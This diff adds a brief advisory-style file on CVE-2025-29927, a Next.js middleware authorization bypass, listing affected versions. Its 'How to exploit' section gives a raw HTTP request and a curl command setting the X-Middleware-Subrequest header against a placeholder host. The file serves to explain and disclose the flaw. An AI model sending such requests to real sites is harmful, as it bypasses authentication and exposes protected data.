@@ -1,0 +1,28 @@
+
+Next.js is a popular React framework for building full‑stack web applications (server‑side rendering, routing, middleware, API routes).
+
+`CVE‑2025‑29927` is a critical authorization‑bypass in Next.js middleware: when an app performs auth checks in middleware, an attacker can craft a request that makes the framework treat the request as an internal subrequest, bypassing those checks.
+
+The vulnerability affects Next.js versions `r!11.1.4` through `r!13.5.6`, `r!14.x` before `r!14.2.25`, and `r!15.x` before `r!15.2.3`.
+
+<b>How to exploit:</b>
+`r!Do not run against systems you don't own/authorize!`
+
+To exploit the vulnerability, add the `r!x-middleware-subrequest: middleware` header to the HTTP request to bypass Next.js middleware authentication checks.
+
+<b>Example:</b>
+HTTP Request:
+```
+GET /dashboard HTTP/1.1
+Host: vulnerable.example
+X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
+```
+curl:
+```
+curl -v -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" \
+  https://vulnerable.example/dashboard
+```
+
+
+<b>More Information:</b> 
+- https://nextjs.org/docs/app/api-reference/file-conventions/middleware
